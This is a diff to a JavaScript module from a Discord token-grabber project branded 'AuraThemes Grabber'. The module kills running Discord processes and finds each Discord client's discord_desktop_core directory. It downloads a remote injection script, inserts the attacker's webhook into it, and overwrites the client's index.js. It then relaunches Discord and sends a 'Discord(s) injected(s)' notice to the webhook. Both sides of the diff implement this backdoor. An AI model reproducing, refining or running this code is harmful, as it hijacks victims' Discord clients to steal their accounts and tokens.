@@ -3,98 +3,17 @@ const Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/m
 
 const fs = require("fs");
 const path = require("path");
-const { exec } = require("child_process");
+const glob = require("glob");
+const process = require("process");
+const { exec, execSync, spawn } = require("child_process");
+const { filter_processes } = require("./../core/core.js");
 const { instance } = require("./../../utils/axios/request.js");
-
-const config = require("./../../config/config.js");
-
-const {
-  WEBHOOK,
-  ERROR_MESSAGE,
-  KILL_DISCORDS,
-  VM_DEBUGGER,
-  DC_INJECTION,
-} = config;
 
 const local = process.env.localappdata;
 
 const injec_path = [];
 
-const discords_dirs = () => {
-  try {
-    return fs.readdirSync(local)
-      .filter((f) => f.includes("iscord"))
-      .map((f) => path.join(local, f));
-  } catch (e) {
-    console.error(e);
-    return [];
-  }
-};
-
-const find_indexs = (f) => {
-  try {
-    fs.readdirSync(f).forEach((d) => {
-
-      let p = path.join(f, d);
-
-      if (fs.statSync(p).isDirectory()) {
-        find_indexs(p);
-      } else if (d === "index.js"
-        && !f.includes("node_modules")
-        && f.includes("desktop_core")
-      ) {
-        injec_path.push(p);
-      }
-    });
-  } catch (e) {
-    console.error(e);
-  }
-};
-
-const injection = async (webhook) => {
-  let paths = [];
-  let desc = [];
-
-  injec_path.forEach((path) => {
-    let match = path.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
-    let name = match ? match[1] : "Not Found";
-
-    desc.push(`\`${name}\``);
-    paths.push({ 
-      path, 
-      name 
-    });
-  });
-
-  await instance({
-    "url": webhook[0],
-    "method": "POST",
-    "data": {
-      "username": 'AuraThemes Grabber - Injection',
-      "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
-      "embeds": [{
-        "title": 'Discord(s) injected(s)',
-        "color": "12740607",
-        "description": desc.length > 0 ? desc.join(", ") : "Not Found",
-        "timestamp": new Date(),
-        "footer": {
-          "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
-          "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
-        }
-      }]
-    }
-  });
-
-  let inject = await instance.get(Injection);
-  let text = inject.data;
-
-  await Promise.all(paths.map(async ({ path }) => {
-    await fs.promises.writeFile(path, text.replace("%WEB" + "HOOK%", webhook[0]), { 
-      encoding: "utf8", 
-      flag: "w" 
-    });
-  }));
-};
+let infected_discord = [];
 
 const buffer_replace = (buf, a, b) => {
   try {
@@ -135,74 +54,105 @@ const better_broke = async () => {
   }
 };
 
-const find_injects = async (f) => {
+const discord_injected = async (res, webhook) => {
+  if (res !== "true") return;
+
+  const filter = await filter_processes("discord");
+
+  let replaced_inject;
+
   try {
-    let d = await fs.promises.readdir(f);
-
-    for (let x of d) {
-      let p = path.join(f, x),
-        ñ = await fs.promises.stat(p);
-
-      if (ñ.isDirectory()) {
-        if (x === "aura")
-          await fs.rmdirSync(p);
-        else
-          await find_injects(p);
+    if (filter.length > 0) {
+      try {
+        filter.forEach((proc) => process.kill(proc.pid));
+      } catch (e) {
       }
     }
-  } catch (e) {
-    console.error(e);
-  }
-};
 
-const kill_discords = async (res) => {
-  if (res !== true) return;
-  try {
-    await exec("tasklist", async (error, stdout, stderr) => {
-      for (let discord_taken of [
-        "Discord.exe",
-        "DiscordCanary.exe",
-        "discordDevelopment.exe",
-        "DiscordPTB.exe",
-      ]) {
-        if (stdout.includes(discord_taken)) {
-          
-          await exec(`taskkill /F /T /IM ${
-            discord_taken
-          }`, (err) => {
-            console.error(err);
-          });
+    const discord_folders = glob.sync(`${local}/*cord*`);
 
-          await exec(`"${
-            local
-          }\\${
-            discord_taken.replace(".exe", "")
-          }\\Update.exe" --processStart ${
-            discord_taken
-          }`, (err) => {
-            console.error(err);
-          });
-        }
+    for (let i = 0; i < discord_folders.length; i++) {
+      const discord_folder = discord_folders[i];
+      const apps = glob.sync(`${discord_folder}/app-*/`);
+
+      if (apps.length < 1) return;
+      //if (path.basename(discord_folder) == "Discord") {}
+
+      for (let x = 0; x < apps.length; x++) {
+        const app = apps[x];
+        const desktop_cores = glob.sync(`${app}/modules/discord_desktop_core-*`);
+
+        injec_path.push(...desktop_cores);
       }
-    });
-  } catch (e) {
-    console.error(e);
-  }
-};
+    }
 
-const discord_injected = async (res) => {
-  if (res !== true) return;
-  try {
-    for (let dir of discords_dirs()) find_indexs(dir);
-    for (let dir of discords_dirs()) await find_injects(dir);
-    await better_broke();
-    await injection(WEBHOOK);
-  } catch (e) {
-    console.error(e);
+    for (let i = 0; i < injec_path.length; i++) {
+      const desktop_path = injec_path[i];
+      const injection = (await instance.get(Injection)).data;
+
+      replaced_inject = injection.replace("%WEB" + "HOOK%", webhook[0]);
+
+      try {
+        await fs.writeFileSync(path.join(`${desktop_path}/discord_desktop_core/index.js`), `${replaced_inject}`, "utf-8");
+
+        const first_directory = glob.sync(`${desktop_path}/discord_d*`)[0];
+
+        if (!fs.existsSync(`${first_directory}/aurathemes`)) await fs.mkdirSync(`${first_directory}/aurathemes`);
+
+        setTimeout(async () => {
+          try {
+            if (desktop_path) {
+              const discord_folder = path.join(desktop_path, "..", "..", "..");
+              const build_bat_path = path.join(desktop_path, "..", "..", `${path.basename(discord_folder)}.exe`);
+
+              const options = {
+                cwd: path.join(desktop_path, "..", ".."),
+                stdio: "inherit",
+              };
+
+              spawn(build_bat_path, [], options);
+            }
+          } catch (e) {
+            console.log(e)
+          }
+        }, 12000);
+
+        injec_path.forEach((path) => {
+          let match = path.match(/Local\/(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\//i);
+          let name = match ? match[1] : "Not Found";
+          infected_discord.push(`\`${name}\``);
+        });
+
+        infected_discord = infected_discord.length > 0 ? infected_discord.join(", ") : "Not Found";
+
+        await instance({
+          "url": webhook[0],
+          "method": "POST",
+          "data": {
+            "username": 'AuraThemes Grabber - Injection',
+            "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
+            "embeds": [{
+              "title": 'Discord(s) injected(s)',
+              "color": "12740607",
+              "description": infected_discord,
+              "timestamp": new Date(),
+              "footer": {
+                "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
+                "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
+              }
+            }]
+          }
+        });
+      } catch (err) {
+        console.log(err)
+      }
+    }
+  } catch (err) {
+    console.log(err)
   }
+  await better_broke();
 };
 
 module.exports = {
-  kill_discords,
   discord_injected
 }
